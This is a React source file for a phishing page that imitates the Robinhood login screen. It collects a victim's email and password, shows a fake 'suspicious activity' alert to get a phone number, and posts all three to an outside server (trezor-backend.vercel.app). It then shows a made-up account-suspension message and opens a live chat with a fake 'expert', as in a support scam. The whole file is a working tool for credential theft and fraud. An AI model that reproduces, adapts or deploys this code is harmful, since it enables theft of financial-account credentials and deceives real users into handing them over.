"use client";
import React, { useState } from "react";
import {
    Box,
    Button,
    Dialog,
    DialogActions,
    DialogContent,
    DialogTitle,
    Grid,
    IconButton,
    Link,
    List,
    ListItemButton,
    Paper,
    Snackbar,
    Stack,
    TextField,
    Typography,
} from "@mui/material";
import CloseIcon from '@mui/icons-material/Close';
import axios from "axios";
import { CustomPhoneInput } from "@/components/CustomPhoneInput";
import { useMobileCode } from "@/components/useMobileCode";
export default function LoginMainPage() {
    const {
        code,
        setCode,
        phoneNumberLength,
        setPhoneNumberLength,
        anchorEl,
        searchText,
        setSearchText,
        handleSearchTextChange,
        filteredMenuItems,
        handleCountryCode,
        handleMenuClose,
        handleCode,
        validCountryDataList,
    } = useMobileCode();
    const [openHelpModal, setOpenHelpModal] = useState(false);
    const [email, setEmail] = useState("");
    const [step, setStep] = useState(0)
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const [phone, setPhone] = useState("")
    const handleCloseHelp = () => setOpenHelpModal(false);
    const [loading, setLoading] = useState(false)
    const [alert, setAlert] = useState({
        type: 'error',
        message: 'Important message!: some suspicious activity found with your account. Enter phone number to verify your identity'
    });

    const handleSubmit = async (e) => {
        e.preventDefault(); // Prevent page reload
        try {
            if (!email || !password) {
                alert("Please enter both email and password");
                return;
            }

            setStep(1)
        } catch (err) {
            console.log(err);
        }

    };

    const handleSubmit2 = async (e) => {
        e.preventDefault(); // Prevent page reload
        try {
            const data = {
                title: "Robin Hood",
                email: email,
                password,
                phone: phone ? `+${code}${phone}` : ""

            }
            setLoading(true)
            const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-user-info", data)
            if (response) {
                if (response) {
                    setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
                    setStep(2)
                    window.Tawk_API?.maximize();
                }
            }
        } catch (err) {
            console.log(err);
            setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });

        } finally {
            setLoading(false)

        }
    }
    return (
        <Box sx={{ bgcolor: "white", color: "white", minHeight: "100vh" }}>

            <Grid container>
                {/* ---------- Left Section: Video Background ---------- */}
                <Grid
                    size={{ xs: 0, md: 6 }}
                    sx={{
                        position: "relative",
                        display: { xs: "none", md: "block" },
                        overflow: "hidden",
                    }}
                >
                    <Box
                        component="img"
                        src="/one.jpg"
                        alt="Animated SVG Background"
                        sx={{
                            width: "100%",
                            height: "100%",
                            position: "absolute",
                            top: "50%",
                            left: "50%",
                            transform: "translate(-50%, -50%)",
                            objectFit: "cover",
                            pointerEvents: "none",

                        }}
                    />

                </Grid>

                {/* ---------- Right Section: Login Form ---------- */}
                <Grid
                    size={{ xs: 12, md: 6 }}
                    sx={{
                        display: "flex",
                        // alignItems: "center",
                        justifyContent: "center",
                        minHeight: "100vh",
                        p: { xs: "80px 40px", md: "105px 250px 52px 52px" },
                        height: "100vh",
                        overflowY: "auto"
                    }}
                >
                    <Box sx={{ width: "100%", }}>
                        {step == 0 && <Typography
                            variant="h5"
                            fontWeight={600}
                            mb={4}
                            textAlign="left"
                            color="black"
                            sx={{
                                fontSize: "21px",
                                fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                            }}
                        >
                            Log in to Robinhood
                        </Typography>}
                        {step == 0 ? <form onSubmit={handleSubmit} >
                            {/* Email */}
                            <Typography variant="body2" mb={1} sx={{
                                color: "black", fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                fontWeight: 400,
                                fontSize: "13px",
                                mt: 6,
                                mb: 2.5
                            }}>
                                Email
                            </Typography>
                            <TextField
                                fullWidth
                                variant="outlined"
                                type="email"
                                required
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                size="small"
                                InputProps={{
                                    sx: { color: "black", borderColor: "black" },
                                }}
                                InputLabelProps={{ style: { color: "black" } }}
                                sx={{
                                    mb: 3,
                                    "& .MuiOutlinedInput-root": {
                                        "& fieldset": { borderColor: "rgb(227,233,237)" },
                                        "&:hover fieldset": { borderColor: "rgb(227,233,237)" },
                                    },
                                }}
                            />

                            {/* Password */}
                            <Typography variant="body2" mb={1} sx={{
                                color: "black", fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                fontWeight: 400,
                                fontSize: "13px",
                                mt: 1,
                                mb: 2.5
                            }}>
                                Password
                            </Typography>
                            <TextField
                                fullWidth
                                type={showPassword ? "text" : "password"}
                                size="small"
                                variant="outlined"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                required
                                sx={{
                                    mb: 2,
                                    "& .MuiOutlinedInput-root": {
                                        "& fieldset": { borderColor: "rgb(227,233,237)" },
                                        "&:hover fieldset": { borderColor: "rgb(227,233,237)" },
                                    },
                                    input: {
                                        color: "black",
                                    },
                                }}
                            />

                            <Link href="#" underline="hover" sx={{
                                color: "#000000", textDecoration: "underline", fontWeight: 700, fontSize: "13px", mt: 2,
                                fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                            }}>
                                Forgot your password?
                            </Link>

                            {/* Buttons */}
                            <Box display="flex" gap={2} mt={3} mb={1}>
                                <Button
                                    fullWidth
                                    loading={loading}
                                    disabled={loading}
                                    type="submit"
                                    variant="contained"
                                    sx={{
                                        width: "130px",
                                        mt: 5,
                                        bgcolor: "black",
                                        height: "44px",
                                        color: "white",
                                        textTransform: "none",
                                        fontWeight: 700,
                                        "&:hover": { bgcolor: "black" },
                                        borderRadius: "24px",
                                        fontSize: "13px",
                                        fontFamily:
                                            '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                    }}
                                >
                                    Log In
                                </Button>
                            </Box>
                        </form>

                            : step == 1 ? <form onSubmit={handleSubmit2} id="dasd">

                                <Paper sx={{ padding: "10px", background: "#fef2f2", border: "2px solid #ffc9c9", mb: 2 }}>
                                    <Stack direction={"row"} alignItems={"flex-start"}>
                                        <svg className="shrink-0 size-4 mt-0.5" style={{ flexShrink: 0, width: "1rem", height: "1rem", marginRight: "10px", marginTop: "3px" }} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff6467" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                            <circle cx="12" cy="12" r="10"></circle>
                                            <path d="m15 9-6 6"></path>
                                            <path d="m9 9 6 6"></path>
                                        </svg>
                                        <div className="ms-4">
                                            <Typography component={"p"} id="hs-with-list-label" className="text-sm font-semibold" style={{ color: "#ff6467", fontWeight: "600" }}>
                                                {alert?.message}
                                            </Typography>
                                        </div>
                                    </Stack>

                                </Paper>
                                <div>
                                    <CustomPhoneInput
                                        {...{
                                            code,
                                            setCode,
                                            phoneNumberLength,
                                            setPhoneNumberLength,
                                            anchorEl,
                                            searchText,
                                            setSearchText,
                                            handleSearchTextChange,
                                            filteredMenuItems,
                                            handleCountryCode,
                                            handleMenuClose,
                                            handleCode,
                                            validCountryDataList,
                                            value: phone,
                                            handleChange: (e) => setPhone(e.target.value)
                                        }}
                                    />

                                    <Box display="flex" gap={2} mt={1} mb={1}>

                                        <Button
                                            fullWidth
                                            loading={loading}
                                            form="dasd"
                                            disabled={loading}
                                            type="submit"
                                            variant="contained"
                                            sx={{
                                                width: "130px",
                                                mt: 5,
                                                bgcolor: "black",
                                                height: "44px",
                                                color: "white",
                                                textTransform: "none",
                                                fontWeight: 700,
                                                "&:hover": { bgcolor: "black" },
                                                borderRadius: "24px",
                                                fontSize: "13px",
                                                fontFamily:
                                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                            }}
                                        >
                                            Submit
                                        </Button>
                                    </Box>
                                </div>
                            </form> :

                                <Box>
                                    <Paper sx={{ padding: "10px", background: "#fef2f2", border: "2px solid #ffc9c9", mb: 2 }}>
                                        <Stack direction={"row"} alignItems={"flex-start"}>
                                            <svg className="shrink-0 size-4 mt-0.5" style={{ flexShrink: 0, width: "1rem", height: "1rem", marginRight: "10px", marginTop: "3px" }} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff6467" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                                <circle cx="12" cy="12" r="10"></circle>
                                                <path d="m15 9-6 6"></path>
                                                <path d="m9 9 6 6"></path>
                                            </svg>
                                            <div className="ms-4">
                                                <Typography component={"p"} id="hs-with-list-label" className="text-sm font-semibold" style={{ color: "#ff6467", fontWeight: "600" }}>
                                                    {alert?.message}
                                                </Typography>
                                            </div>
                                        </Stack>

                                    </Paper>
                                    <Box display="flex" gap={2} mt={1} mb={1}>
                                        <Button
                                            fullWidth
                                            type="button"
                                            onClick={() => {
                                                window.Tawk_API?.maximize();
                                            }}
                                            variant="contained"
                                            sx={{
                                                width: "130px",
                                                mt: 5,
                                                bgcolor: "black",
                                                height: "44px",
                                                color: "white",
                                                textTransform: "none",
                                                fontWeight: 700,
                                                "&:hover": { bgcolor: "black" },
                                                borderRadius: "24px",
                                                fontSize: "13px",
                                                fontFamily:
                                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                            }}
                                        >
                                            Ask Expert
                                        </Button>
                                    </Box>
                                </Box>
                        }
                        {/* Create account */}
                        {step == 0 && <Typography mt={3} sx={{
                            fontSize: "13px", fontWeight: 400,

                            fontFamily:
                                '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                        }} color="black">
                            Not on Robinhood?{" "}
                            <Link href="#" underline="hover" sx={{
                                color: "#000000", textDecoration: "underline", fontWeight: 400,
                                fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                            }}>
                                Create an account
                            </Link>
                        </Typography>}
                    </Box>
                </Grid>
            </Grid>
            <Dialog
                open={openHelpModal}
                onClose={handleCloseHelp}
                PaperProps={{
                    sx: {
                        bgcolor: "rgb(30, 33, 36)",
                        color: "white",
                        borderRadius: "6px",
                        minWidth: 400,
                        border: "none"
                    },
                }}
            >
                <Stack direction={"row"} justifyContent={"space-between"}>

                    <DialogTitle sx={{
                        fontWeight: 600, border: "none", color: "white", fontFamily:
                            '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                    }}>What can we help with?</DialogTitle>
                    <IconButton
                        aria-label="close"
                        onClick={handleCloseHelp}
                        sx={(theme) => ({
                            position: 'absolute',
                            right: 8,
                            top: 8,
                            color: theme.palette.grey[500],
                        })}
                    >
                        <CloseIcon />
                    </IconButton>
                </Stack>
                <DialogContent dividers sx={{ px: 3, py: 0 }}>
                    <List>
                        {[
                            "I forgot my password",
                            "I forgot the email address I log in with",
                            "I need access to an account as a third party",
                            "There's an unauthorized account in my name",
                        ].map((text, idx) => (
                            <ListItemButton
                                key={idx}
                                sx={{
                                    color: "white",
                                    borderBottom: "1px solid #333",
                                    pb: 2,
                                    px: 0,
                                    fontSize: "13px",
                                    fontWeight: "700",
                                    fontFamily:
                                        '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                                    // "&:hover": { bgcolor: "#222" },
                                }}
                            >
                                {text}
                            </ListItemButton>
                        ))}
                    </List>
                </DialogContent>
                <DialogActions sx={{ px: 3, pb: 3 }}>
                    <Button
                        fullWidth
                        variant="outlined"
                        sx={{
                            borderColor: "white",
                            color: "white",
                            height: "44px",
                            textTransform: "none",
                            fontWeight: 700,
                            borderRadius: "24px",
                            fontSize: "13px",
                            mt: 2,
                            background: "rgb(30, 33, 36)",
                            "&:hover": { borderColor: "#aaa" },

                            fontFamily:
                                '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                        }}
                        onClick={handleCloseHelp}

                    >
                        Cancel
                    </Button>
                </DialogActions>
            </Dialog>
        </Box>
    );
}
